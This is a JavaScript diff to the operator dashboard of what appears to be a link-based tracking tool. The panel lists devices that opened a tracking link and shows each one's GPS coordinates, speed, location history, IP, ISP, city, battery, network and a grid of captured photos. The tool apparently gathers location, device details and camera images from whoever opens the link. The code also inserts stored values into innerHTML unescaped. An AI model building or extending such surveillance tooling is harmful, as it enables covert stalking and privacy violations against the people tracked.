@@ -205,83 +205,93 @@ function selectSession(sessionId) {
   if (selectedTrackerId) updateDetailPanel(selectedTrackerId);
 }
 
-async function updateDetailPanel(trackerId) {
+async function updateDetailPanel(trackerId, liveData = null) {
+  if (!trackerId) return;
+  selectedTrackerId = trackerId;
+  const panel = document.getElementById('detail-panel');
+  panel.classList.remove('hidden');
+
   let tracker;
-  try {
-    const res = await fetch(`/api/tracker/${trackerId}`);
-    tracker = await res.json();
-  } catch (e) { return; }
+  if (liveData && liveData.id === trackerId) {
+    tracker = liveData;
+  } else {
+    try {
+      const res = await fetch(`/api/tracker/${trackerId}`);
+      tracker = await res.json();
+    } catch (e) { return; }
+  }
 
   document.getElementById('detail-name').textContent = tracker.name;
 
-  // Render Session Tabs
+  // Tabs
   const tabsEl = document.getElementById('session-tabs');
   if (tracker.sessions?.length > 0) {
     if (!selectedSessionId) selectedSessionId = tracker.sessions[0].sessionId;
-    
     tabsEl.innerHTML = tracker.sessions.map(s => `
       <div class="session-tab ${s.sessionId === selectedSessionId ? 'active' : ''}" onclick="selectSession('${s.sessionId}')">
-        <span class="dot" style="background: ${s.active ? '#22c55e' : '#64748b'}"></span>
-        ${s.sessionId}
+        <span class="dot" style="background: ${s.active ? '#10b981' : '#64748b'}"></span>
+        Device ${s.sessionId.slice(-4).toUpperCase()}
       </div>
     `).join('');
   } else {
-    tabsEl.innerHTML = '<div class="empty-state">No devices connected to this link</div>';
+    tabsEl.innerHTML = '<div class="empty-state">No devices online</div>';
     selectedSessionId = null;
   }
 
   const session = tracker.sessions?.find(s => s.sessionId === selectedSessionId);
   const di = session?.deviceInfo || {};
-  const loc = session?.lastLocation || {};
+  const loc = session?.lastLocation || tracker.lastLocation || {};
 
-  document.getElementById('detail-status').innerHTML = session?.active
-    ? '<span class="badge badge-green">Online</span>'
-    : '<span class="badge badge-gray">Offline</span>';
-  
-  document.getElementById('detail-last-update').textContent = loc.timestamp ? formatTime(loc.timestamp) : '—';
-  document.getElementById('detail-coords').textContent = loc.latitude ? `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}` : '—';
-  document.getElementById('detail-accuracy').textContent = loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '—';
-  document.getElementById('detail-speed').textContent = loc.speed != null ? `${(loc.speed * 3.6).toFixed(1)} km/h` : '—';
-  document.getElementById('detail-device').textContent = (di.platform || '') + ' ' + (di.browser || '');
+  const pairs = {
+    'detail-status': session?.active ? '<span class="badge badge-green">Online</span>' : '<span class="badge badge-gray">Offline</span>',
+    'detail-last-update': loc.timestamp ? formatTime(loc.timestamp) : 'Never',
+    'detail-coords': loc.latitude ? `${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}` : '—',
+    'detail-accuracy': loc.accuracy ? `±${Math.round(loc.accuracy)}m` : '—',
+    'detail-speed': loc.speed != null ? `${(loc.speed * 3.6).toFixed(1)} km/h` : '—',
+    'detail-model': di.deviceModel ? `${di.deviceModel}` : (di.platform || '—'),
+    'detail-battery': di.battery ? `${di.battery} (${di.charging === 'Yes' ? 'Charging' : 'Bat'})` : '—',
+    'detail-network': di.network ? `${di.network.toUpperCase()}` : '—',
+    'detail-ip': di.ipAddress || '—',
+    'detail-isp': di.isp || '—',
+    'detail-location': di.city ? `${di.city}, ${di.country || ''}` : '—',
+    'detail-screen': di.screen || '—',
+    'detail-timezone': di.timezone || '—'
+  };
 
-  document.getElementById('detail-device-name').textContent = di.deviceName || '—';
-  document.getElementById('detail-model').textContent = di.deviceModel ? `${di.deviceModel} (${di.platformVer || ''})` : '—';
-  document.getElementById('detail-battery').textContent = di.battery ? `${di.battery} (${di.charging || ''})` : '—';
-  document.getElementById('detail-network').textContent = di.network ? `${di.network} (${di.downlink || ''})` : '—';
-  document.getElementById('detail-browser').textContent = di.browser || '—';
-  document.getElementById('detail-ip').textContent = di.ipAddress || '—';
-  document.getElementById('detail-isp').textContent = di.isp || '—';
-  document.getElementById('detail-location').textContent = di.city ? `${di.city}, ${di.region || ''}, ${di.country || ''}` : '—';
-  document.getElementById('detail-screen').textContent = di.screen || '—';
-  document.getElementById('detail-timezone').textContent = di.timezone || '—';
+  Object.entries(pairs).forEach(([id, val]) => {
+    const el = document.getElementById(id);
+    if (el) {
+      if (id === 'detail-status') el.innerHTML = val;
+      else el.textContent = val;
+    }
+  });
 
-  // History for THIS session
-  const histEl = document.getElementById('location-history');
-  const sessionLocations = tracker.locations?.filter(l => l.sessionId === selectedSessionId) || [];
-  if (sessionLocations.length > 0) {
-    histEl.innerHTML = sessionLocations.slice(-20).reverse().map(l => `
+  renderHistory(tracker.locations?.filter(l => l.sessionId === selectedSessionId) || []);
+  renderPhotos(tracker.photos?.filter(p => p.sessionId === selectedSessionId) || []);
+}
+
+function renderHistory(locations) {
+  const el = document.getElementById('location-history');
+  if (locations.length > 0) {
+    el.innerHTML = locations.slice(-15).reverse().map(l => `
       <div class="history-item">
         <div class="history-coords">${l.latitude.toFixed(5)}, ${l.longitude.toFixed(5)}</div>
         <div class="history-time">${formatTime(l.timestamp)}</div>
       </div>
     `).join('');
-  } else {
-    histEl.innerHTML = '<div class="empty-state">No history for this device</div>';
-  }
+  } else { el.innerHTML = '<div class="empty-state">No history yet</div>'; }
+}
 
-  // Photos for THIS session
-  const photoEl = document.getElementById('photo-grid');
-  const sessionPhotos = tracker.photos?.filter(p => p.sessionId === selectedSessionId) || [];
-  if (sessionPhotos.length > 0) {
-    photoEl.innerHTML = sessionPhotos.slice(-12).reverse().map(p => `
+function renderPhotos(photos) {
+  const el = document.getElementById('photo-grid');
+  if (photos.length > 0) {
+    el.innerHTML = photos.slice(-12).reverse().map(p => `
       <div class="photo-item" onclick="window.open('${p.image}', '_blank')">
-        <img src="${p.image}" alt="Capture" />
+        <img src="${p.image}" />
         <div class="photo-meta">${formatTime(p.timestamp)}</div>
       </div>
     `).join('');
-  } else {
-    photoEl.innerHTML = '<div class="empty-state">No photos for this device</div>';
-  }
+  } else { el.innerHTML = '<div class="empty-state">No photos yet</div>'; }
 }
 
 function updateStats() {
